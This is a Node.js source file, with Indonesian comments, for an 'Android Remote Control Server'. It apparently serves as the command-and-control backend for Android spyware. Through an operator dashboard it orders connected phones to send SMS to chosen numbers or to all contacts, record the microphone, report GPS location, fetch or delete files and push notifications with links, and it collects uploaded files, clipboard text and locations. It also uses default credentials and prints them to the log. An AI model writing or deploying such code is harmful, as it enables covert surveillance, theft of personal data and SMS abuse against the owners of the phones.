// index.js

// -----------------------------------------------------------
// 1. Setup & Import Modul
// -----------------------------------------------------------
require("dotenv").config() // Load environment variables dari .env

const express = require("express")
const ws = require("ws") // Gunakan 'ws' bukan 'webSocket'
const http = require("http")
const jwt = require("jsonwebtoken")
const bcrypt = require("bcrypt")
const multer = require("multer")
const bodyParser = require("body-parser")
const cors = require("cors") // Untuk mengatasi masalah CORS antara frontend & backend
const fs = require("fs") // Untuk operasi file sistem
const path = require("path") // Untuk bekerja dengan path file
const { v4: uuidv4 } = require("uuid")

// -----------------------------------------------------------
// 2. Konfigurasi
// -----------------------------------------------------------
const PORT = process.env.PORT || 8999
const JWT_SECRET = process.env.JWT_SECRET || "your-secret-key-here"
const ADMIN_USERNAME = process.env.ADMIN_USERNAME || "admin"
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || "admin123"
const ADMIN_PASSWORD_HASH = bcrypt.hashSync(ADMIN_PASSWORD, 10) // Hash password saat startup
const KEEP_ALIVE_URL = process.env.KEEP_ALIVE_URL || `http://localhost:${PORT}`

// Pastikan folder 'uploads' ada
const uploadsDir = path.join(__dirname, "uploads")
if (!fs.existsSync(uploadsDir)) {
  fs.mkdirSync(uploadsDir)
}

// Pastikan folder 'web' ada untuk static files
const webDir = path.join(__dirname, "web")
if (!fs.existsSync(webDir)) {
  fs.mkdirSync(webDir)
}

// -----------------------------------------------------------
// 3. Inisialisasi Aplikasi
// -----------------------------------------------------------
const app = express()
const appServer = http.createServer(app)
const appSocket = new ws.Server({ server: appServer })

// Map untuk menyimpan koneksi client Android (UUID -> {ws, model, battery, ...})
const androidClients = new Map()
// Set untuk menyimpan koneksi WebSocket dari frontend (browser)
const frontendSockets = new Set()

// -----------------------------------------------------------
// 4. Middleware Global
// -----------------------------------------------------------
app.use(cors()) // Izinkan semua CORS requests, untuk pengembangan. Sesuaikan di produksi.
app.use(bodyParser.json()) // Untuk parsing application/json
app.use(bodyParser.urlencoded({ extended: true })) // Untuk parsing application/x-www-form-urlencoded

// Middleware untuk melayani file statis dari folder 'web' (frontend)
app.use(express.static(webDir))
// Middleware untuk melayani file yang diupload dari folder 'uploads'
app.use("/uploads", express.static(uploadsDir))

// Konfigurasi Multer untuk upload file
// Menggunakan memoryStorage karena file akan langsung diolah atau disimpan ke disk secara manual
const upload = multer({ storage: multer.memoryStorage() })

// -----------------------------------------------------------
// 5. Middleware Autentikasi (JWT)
// -----------------------------------------------------------
function authenticateToken(req, res, next) {
  const authHeader = req.headers["authorization"]
  const token = authHeader && authHeader.split(" ")[1] // Format: Bearer TOKEN

  if (token == null) {
    console.warn("Authentication: No token provided.")
    return res.sendStatus(401) // Unauthorized
  }

  jwt.verify(token, JWT_SECRET, (err, user) => {
    if (err) {
      console.warn("Authentication: Invalid or expired token.", err.message)
      return res.sendStatus(403) // Forbidden (token invalid/expired)
    }
    req.user = user // Simpan informasi user di objek request
    next() // Lanjutkan ke handler rute berikutnya
  })
}

function getMimeType(ext) {
  const mimeTypes = {
    '.jpg': 'image/jpeg',
    '.jpeg': 'image/jpeg',
    '.png': 'image/png',
    '.gif': 'image/gif',
    '.bmp': 'image/bmp',
    '.webp': 'image/webp',
    '.mp3': 'audio/mpeg',
    '.wav': 'audio/wav',
    '.aac': 'audio/aac',
    '.flac': 'audio/flac',
    '.ogg': 'audio/ogg',
    '.mp4': 'video/mp4',
    '.avi': 'video/avi',
    '.mkv': 'video/mkv',
    '.mov': 'video/quicktime',
    '.wmv': 'video/x-ms-wmv',
    '.txt': 'text/plain',
    '.log': 'text/plain',
    '.json': 'application/json'
  }
  return mimeTypes[ext] || 'application/octet-stream'
}

// -----------------------------------------------------------
// 6. REST API Endpoints (Backend untuk Frontend)
// -----------------------------------------------------------

// Endpoint Login
app.post("/api/login", async (req, res) => {
  const { username, password } = req.body

  if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
    // Bandingkan dengan password plain text dari .env
    const token = jwt.sign({ username }, JWT_SECRET, { expiresIn: "24h" }) // Token berlaku 24 jam
    res.json({ success: true, token })
  } else {
    res.status(401).json({ success: false, message: "Invalid username or password." })
  }
})

// Endpoint untuk mendapatkan daftar perangkat yang terhubung
app.get("/api/connected-devices", authenticateToken, (req, res) => {
  const devicesInfo = {}
  androidClients.forEach((value, key) => {
    // Kirim hanya informasi yang relevan, tanpa objek WebSocket
    devicesInfo[key] = {
      model: value.model,
      battery: value.battery,
      version: value.version,
      brightness: value.brightness,
      provider: value.provider,
      lastSeen: value.lastSeen || new Date().toISOString(),
    }
  })
  res.json(devicesInfo)
})

app.get("/api/uploads", authenticateToken, (req, res) => {
  try {
    const files = fs.readdirSync(uploadsDir)
    const fileList = files.map(filename => {
      const filePath = path.join(uploadsDir, filename)
      const stats = fs.statSync(filePath)
      const ext = path.extname(filename).toLowerCase()
      
      // Tentukan tipe file
      let fileType = 'other'
      if (['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp'].includes(ext)) {
        fileType = 'image'
      } else if (['.mp4', '.avi', '.mkv', '.mov', '.wmv'].includes(ext)) {
        fileType = 'video'
      } else if (['.mp3', '.wav', '.aac', '.flac', '.ogg'].includes(ext)) {
        fileType = 'audio'
      } else if (['.txt', '.log', '.json'].includes(ext)) {
        fileType = 'text'
      }
      
      return {
        filename: filename,
        url: `/uploads/${filename}`,
        size: stats.size,
        modified: stats.mtime.toISOString(),
        type: fileType,
        mimetype: getMimeType(ext) // Tambahkan fungsi helper
      }
    })
    
    res.json(fileList)
  } catch (error) {
    console.error("Error reading uploads directory:", error)
    res.status(500).json({ success: false, message: "Failed to read uploads directory" })
  }
})

// Endpoint untuk mengirim perintah ke perangkat Android tertentu
app.post("/api/command/:uuid", authenticateToken, (req, res) => {
  const { uuid } = req.params
  const { command, value1, value2 } = req.body // 'command' adalah jenis perintah, 'value1', 'value2' untuk argumen

  const targetClient = androidClients.get(uuid)
  if (!targetClient || targetClient.ws.readyState !== ws.OPEN) {
    return res.status(404).json({ success: false, message: "Device not found or disconnected." })
  }

  let fullCommand = command
// Format perintah sesuai kebutuhan Android client
switch (command) {
  case "send_message":
    if (!value1 || !value2)
      return res.status(400).json({ success: false, message: "Number and message are required." })
    fullCommand = `send_message:${value1}/${value2}`
    break
  case "send_message_to_all":
    if (!value1)
      return res.status(400).json({ success: false, message: "Message is required." })
    fullCommand = `send_message_to_all:${value1}`
    break
  case "file":
    if (!value1)
      return res.status(400).json({ success: false, message: "File path is required." })
    fullCommand = `file:${value1}`
    break
  case "delete_file":
    if (!value1)
      return res.status(400).json({ success: false, message: "File path is required." })
    fullCommand = `delete_file:${value1}`
    break
  case "microphone":
    if (!value1)
      return res.status(400).json({ success: false, message: "Duration is required." })
    fullCommand = `microphone:${value1}`
    break
  case "toast":
    if (!value1)
      return res.status(400).json({ success: false, message: "Toast message is required." })
    fullCommand = `toast:${value1}`
    break
  case "show_notification":
    if (!value1 || !value2)
      return res.status(400).json({ success: false, message: "Title and link are required for notification." })
    fullCommand = `show_notification:${value1}/${value2}`
    break
  case "play_audio":
    if (!value1)
      return res.status(400).json({ success: false, message: "Audio link is required." })
    fullCommand = `play_audio:${value1}`
    break
  // ✅ Tambahkan ini:
  case "vibrate":
    fullCommand = "vibrate"
    break
  case "stop_audio":
    fullCommand = "stop_audio"
    break
  case "gpsLocation":
    fullCommand = "gpsLocation"
    break
  // 🧭 Perintah tanpa argumen tambahan lainnya
  default:
    break
}

  try {
    targetClient.ws.send(fullCommand)
    targetClient.lastSeen = new Date().toISOString()
    console.log(`Command sent to ${targetClient.model} (${uuid}): ${fullCommand}`)
    res.json({ success: true, message: `Command '${command}' sent to device.` })
  } catch (error) {
    console.error(`Error sending command to ${uuid}:`, error)
    res.status(500).json({ success: false, message: "Failed to send command to device." })
  }
})

// -----------------------------------------------------------
// 7. Endpoint Upload dari Android Client
// -----------------------------------------------------------

// Endpoint untuk upload file (foto, rekaman suara, dll.)
app.post("/uploadFile", upload.single("file"), (req, res) => {
  const deviceUuid = req.headers["device-uuid"]
  const model = req.headers.model || "Unknown"
  const originalname = req.file.originalname
  const safeFilename = `${Date.now()}_${originalname.replace(/[^a-z0-9.]/gi, "_")}`
  const filePath = path.join(uploadsDir, safeFilename)
  const fileUrl = `/uploads/${safeFilename}`

  try {
    fs.writeFileSync(filePath, req.file.buffer)
    console.log(`File uploaded: ${filePath} from ${model} (${deviceUuid})`)

    // Update last seen
    const client = androidClients.get(deviceUuid)
    if (client) {
      client.lastSeen = new Date().toISOString()
    }

    // Tentukan tipe file berdasarkan mimetype dan extension
    const ext = path.extname(originalname).toLowerCase()
    let fileType = 'other'
    
    if (req.file.mimetype.startsWith('image/') || ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp'].includes(ext)) {
      fileType = 'image'
    } else if (req.file.mimetype.startsWith('audio/') || ['.mp3', '.wav', '.aac', '.flac', '.ogg'].includes(ext)) {
      fileType = 'audio'
    } else if (req.file.mimetype.startsWith('video/') || ['.mp4', '.avi', '.mkv', '.mov', '.wmv'].includes(ext)) {
      fileType = 'video'
    } else if (req.file.mimetype.startsWith('text/') || ['.txt', '.log', '.json'].includes(ext)) {
      fileType = 'text'
    }

    const liveMessage = `File uploaded: ${originalname} (${(req.file.size / 1024).toFixed(1)} KB) - Type: ${fileType}`
    
    frontendSockets.forEach((ws) => {
      if (ws.readyState === ws.OPEN && ws.isAuthenticated) {
        // Kirim sebagai live message
        ws.send(JSON.stringify({
          type: "android_message",
          deviceUuid: deviceUuid,
          model: model,
          message: liveMessage,
          timestamp: new Date().toISOString(),
        }))
        
        // Kirim data lengkap dengan tipe file yang benar
        ws.send(JSON.stringify({
          type: "file_uploaded",
          deviceUuid: deviceUuid,
          model: model,
          filename: originalname,
          safeFilename: safeFilename,
          url: fileUrl,
          mimetype: req.file.mimetype,
          size: req.file.size,
          fileType: fileType, // Tambahkan ini
          timestamp: new Date().toISOString(),
        }))
      }
    })
    
    res.status(200).send("File uploaded successfully")
  } catch (error) {
    console.error("Error saving file:", error)
    res.status(500).send("Failed to upload file")
  }
})

// Endpoint untuk upload teks (clipboard, daftar aplikasi, info perangkat, dll.)
app.post("/uploadText", (req, res) => {
  const deviceUuid = req.headers["device-uuid"]
  const model = req.headers.model || "Unknown"
  const textData = req.body["text"] 
  const dataType = req.body["dataType"] || "general"

  console.log(`Text uploaded (${dataType}): from ${model} (${deviceUuid})`)
  console.log(`Content: ${textData.substring(0, 200)}...`)

  // Update last seen
  const client = androidClients.get(deviceUuid)
  if (client) {
    client.lastSeen = new Date().toISOString()
  }

  // TAMBAHAN: Kirim juga sebagai live message
  const liveMessage = `Text data received (${dataType}): ${textData.substring(0, 100)}${textData.length > 100 ? '...' : ''}`
  
  frontendSockets.forEach((ws) => {
    if (ws.readyState === ws.OPEN && ws.isAuthenticated) {
      // Kirim sebagai live message
      ws.send(JSON.stringify({
        type: "android_message",
        deviceUuid: deviceUuid,
        model: model,
        message: liveMessage,
        timestamp: new Date().toISOString(),
      }))
      
      // Kirim juga data lengkap untuk tab results
      ws.send(JSON.stringify({
        type: "text_data",
        dataType: dataType,
        deviceUuid: deviceUuid,
        model: model,
        content: textData,
        timestamp: new Date().toISOString(),
      }))
    }
  })
  
  res.status(200).send("Text uploaded successfully")
})

// Endpoint untuk upload lokasi
app.post("/uploadLocation", (req, res) => {
  const deviceUuid = req.headers["device-uuid"]
  const model = req.headers.model || "Unknown"
  const lat = req.body["lat"]
  const lon = req.body["lon"]

  console.log(`Location uploaded: Lat ${lat}, Lon ${lon} from ${model} (${deviceUuid})`)

  // Update last seen
  const client = androidClients.get(deviceUuid)
  if (client) {
    client.lastSeen = new Date().toISOString()
  }

  // TAMBAHAN: Kirim sebagai live message juga
  const liveMessage = `Location shared: ${lat}, ${lon}`
  
  frontendSockets.forEach((ws) => {
    if (ws.readyState === ws.OPEN && ws.isAuthenticated) {
      // Kirim sebagai live message
      ws.send(JSON.stringify({
        type: "android_message",
        deviceUuid: deviceUuid,
        model: model,
        message: liveMessage,
        timestamp: new Date().toISOString(),
      }))
      
      // Kirim juga data lengkap untuk tab results
      ws.send(JSON.stringify({
        type: "location_data",
        deviceUuid: deviceUuid,
        model: model,
        lat: lat,
        lon: lon,
        timestamp: new Date().toISOString(),
      }))
    }
  })
  
  res.status(200).send("Location uploaded successfully")
})

// -----------------------------------------------------------
// 8. WebSocket Server (Untuk Komunikasi dengan Android & Frontend)
// -----------------------------------------------------------

appSocket.on("connection", (ws, req) => {
  const userAgent = req.headers["user-agent"] || ""

  // Ini adalah koneksi dari FRONTEND (Browser)
  if (userAgent.includes("Mozilla") || userAgent.includes("Chrome") || userAgent.includes("Safari")) {
    ws.isAuthenticated = false // Default: belum terautentikasi
    // Frontend harus mengirim token JWT setelah koneksi
    ws.on("message", (message) => {
      try {
        const msg = JSON.parse(message.toString())
        if (msg.type === "auth" && msg.token) {
          jwt.verify(msg.token, JWT_SECRET, (err, user) => {
            if (!err) {
              ws.isAuthenticated = true
              frontendSockets.add(ws)
              console.log("Frontend WebSocket authenticated and connected.")
              // Kirim daftar perangkat aktif ke frontend baru
              const devices = []
              androidClients.forEach((client, uuid) => {
                devices.push({
                  uuid: uuid,
                  model: client.model,
                  battery: client.battery,
                  version: client.version,
                  brightness: client.brightness,
                  provider: client.provider,
                  lastSeen: client.lastSeen,
                })
              })
              ws.send(
                JSON.stringify({
                  type: "initial_devices",
                  devices: devices,
                }),
              )
            } else {
              console.warn("Frontend WS Auth failed: Invalid token.")
              ws.close()
            }
          })
        } else if (msg.type === "pong") {
          // Handle pong response
          console.log("Received pong from frontend")
        }
      } catch (error) {
        console.error("Error parsing frontend WebSocket message:", error)
      }
    })

    ws.on("close", () => {
      if (ws.isAuthenticated) {
        frontendSockets.delete(ws)
        console.log("Frontend WebSocket disconnected.")
      }
    })
    return // Hentikan eksekusi untuk koneksi frontend
  }

  // Ini adalah koneksi dari ANDROID CLIENT
  const uuid = req.headers["device-uuid"] || uuidv4() // Android harus mengirim UUID-nya
  const model = req.headers.model || "Unknown"
  const battery = req.headers.battery || "Unknown"
  const version = req.headers.version || "Unknown"
  const brightness = req.headers.brightness || "Unknown"
  const provider = req.headers.provider || "Unknown"

  ws.uuid = uuid // Simpan UUID di objek WebSocket
  androidClients.set(uuid, {
    model: model,
    battery: battery,
    version: version,
    brightness: brightness,
    provider: provider,
    ws: ws, // Simpan referensi WebSocket
    lastSeen: new Date().toISOString(),
  })

  console.log(`New Android Device Online: ${model} (${uuid})`)

  // Notifikasi semua frontend yang terhubung bahwa ada perangkat baru online
  frontendSockets.forEach((s) => {
    if (s.readyState === ws.OPEN && s.isAuthenticated) {
      s.send(
        JSON.stringify({
          type: "device_status",
          status: "online",
          device: {
            uuid: uuid,
            model: model,
            battery: battery,
            version: version,
            brightness: brightness,
            provider: provider,
            lastSeen: new Date().toISOString(),
          },
        }),
      )
    }
  })

  // Handle incoming messages from Android client
ws.on("message", (data) => {
  const message = data.toString()
  console.log(`Received from Android (${uuid}):`, message)

  const client = androidClients.get(uuid)
  if (client) client.lastSeen = new Date().toISOString()

  if (message === "pong") {
    console.log(`Received pong from Android device ${uuid}`)
    return
  }

  // PERBAIKAN: Pastikan konstanta WebSocket menggunakan ws bukan WebSocket
  const WebSocket = ws

  // Teruskan pesan ke frontend - PERBAIKAN: Pastikan pesan selalu dikirim
  frontendSockets.forEach((frontendSocket) => {
    if (frontendSocket.readyState === WebSocket.OPEN && frontendSocket.isAuthenticated) {
      console.log(`Forwarding message to frontend: ${message}`) // Debug log
      frontendSocket.send(JSON.stringify({
        type: "android_message",
        deviceUuid: uuid,
        model: model,
        message: message,
        timestamp: new Date().toISOString(),
      }))
    }
  })

  // Jika message mengandung status respons perintah
  if (
    message.includes("success") ||
    message.includes("completed") ||
    message.includes("sent") ||
    message.includes("error") ||
    message.includes("failed") ||
    message.includes("SMS") ||
    message.includes("notification") ||
    message.includes("toast") ||
    message.includes("vibrate") ||
    message.includes("stop_audio")
  ) {
    frontendSockets.forEach((frontendSocket) => {
      if (frontendSocket.readyState === WebSocket.OPEN && frontendSocket.isAuthenticated) {
        console.log(`Sending command response to frontend: ${message}`) // Debug log
        frontendSocket.send(JSON.stringify({
          type: "command_response",
          deviceUuid: uuid,
          model: model,
          response: message,
          timestamp: new Date().toISOString(),
        }))
      }
    })
  }
})

ws.on("close", () => {
  console.log(`Android device disconnected: ${uuid}`)
  
  // Notify frontend about device disconnection
  frontendSockets.forEach((s) => {
    if (s.readyState === WebSocket.OPEN && s.isAuthenticated) {
      s.send(JSON.stringify({
        type: "device_status",
        status: "offline",
        uuid: uuid,
        timestamp: new Date().toISOString(),
      }))
    }
  })
  
  androidClients.delete(uuid)
})

ws.on("error", (error) => {
  console.error(`WebSocket error for device ${uuid}:`, error)
  
  // Clean up errored client
  if (androidClients.has(uuid)) {
    console.log(`Removing errored client: ${uuid}`)
    
    frontendSockets.forEach((s) => {
      if (s.readyState === WebSocket.OPEN && s.isAuthenticated) {
        s.send(JSON.stringify({
          type: "device_status",
          status: "offline",
          uuid: uuid,
          timestamp: new Date().toISOString(),
        }))
      }
    })
    
    androidClients.delete(uuid)
  }
})

}) // ✅ ADD THIS: Penutup untuk WebSocket connection handler

// -----------------------------------------------------------
// 9. Keep-Alive Server & Error Handling
// -----------------------------------------------------------
// Ping clients untuk menjaga koneksi tetap hidup dan membersihkan koneksi mati
setInterval(() => {
  const deadClients = []
  androidClients.forEach((client, uuid) => {
    if (client.ws.readyState !== WebSocket.OPEN) {
      deadClients.push(uuid)
    } else {
      try {
        // Kirim ping ke Android client
        client.ws.send("ping") // Android client harus merespons dengan 'pong'
      } catch (error) {
        console.warn(`Error sending ping to Android client ${uuid}:`, error.message)
        deadClients.push(uuid)
      }
    }
  })

  // Hapus client yang mati
  deadClients.forEach((uuid) => {
    console.log(`Removed dead Android client: ${uuid}`)
    frontendSockets.forEach((s) => {
      if (s.readyState === WebSocket.OPEN && s.isAuthenticated) {
        s.send(
          JSON.stringify({
            type: "device_status",
            status: "offline",
            uuid: uuid,
            timestamp: new Date().toISOString(),
          }),
        )
      }
    })
    androidClients.delete(uuid)
  })

  // Frontend sockets juga bisa di-ping jika diperlukan
  const deadFrontendSockets = []
  frontendSockets.forEach((s) => {
    if (s.readyState !== WebSocket.OPEN) {
      deadFrontendSockets.push(s)
    } else {
      try {
        s.send(JSON.stringify({ type: "ping" }))
      } catch (error) {
        console.warn("Error sending ping to frontend socket:", error.message)
        deadFrontendSockets.push(s)
      }
    }
  })
  deadFrontendSockets.forEach((s) => {
    frontendSockets.delete(s)
  })
}, 30000) // Setiap 30 detik

// Handle error server HTTP
appServer.on("error", (error) => {
  console.error("HTTP Server error:", error)
})

// Handle error WebSocket server
appSocket.on("error", (error) => {
  console.error("WebSocket Server error:", error)
})

// -----------------------------------------------------------
// 10. Jalankan Server
// -----------------------------------------------------------
appServer.listen(PORT, () => {
  console.log(`🚀 Android Remote Control Server is running on http://localhost:${PORT}`)
  console.log(`📱 Access dashboard at http://localhost:${PORT}`)
  console.log(`🔐 Default credentials: ${ADMIN_USERNAME} / ${ADMIN_PASSWORD}`)
  console.log(`📁 Upload directory: ${uploadsDir}`)
  console.log(`🌐 Web directory: ${webDir}`)
})